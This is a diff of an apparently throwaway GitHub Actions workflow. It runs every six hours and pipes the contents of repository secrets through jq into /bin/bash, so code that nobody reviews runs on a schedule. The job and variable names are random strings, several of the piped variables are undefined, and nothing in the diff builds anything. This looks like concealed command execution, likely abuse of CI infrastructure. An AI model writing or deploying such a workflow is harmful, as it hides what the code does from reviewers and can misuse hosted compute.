@@ -1,24 +1,23 @@
 name: gongwanqiang7561
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 0/6 * * *'
+    - cron: '42 2/6 * * *'
 
-jobs:  # 473
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: gongwanqiang7561
         env:
-          jwcpu51023: ${{ secrets.jwcpu51023 }}
+          iutub108: ${{ secrets.iutub108 }}
         run: |
-          echo $jwcpu51023 | jq -r .wlhfx207 | /bin/bash
-          echo $ce175 | jq -r .p24 | /bin/bash
-          echo $b98 | jq -r .mcb4 | /bin/bash
-          echo $asm68075 | jq -r .p273 | /bin/bash
-          echo $yzv70473 | jq -r .znfk146 | /bin/bash
-          echo $rcqyj76 | jq -r .ta54 | /bin/bash
-          echo $ea3505 | jq -r .n42518 | /bin/bash
-          echo $xsm39620 | jq -r .uncc13 | /bin/bash
+          echo $iutub108 | jq -r .du8 | /bin/bash
+          echo $hw5 | jq -r .abe79 | /bin/bash
+          echo $tnj9 | jq -r .gcsn37829 | /bin/bash
+          echo $lyun0 | jq -r .at994 | /bin/bash
+          echo $pmw5 | jq -r .kpr30615 | /bin/bash
+          echo $plvgz6 | jq -r .gb7141 | /bin/bash
 
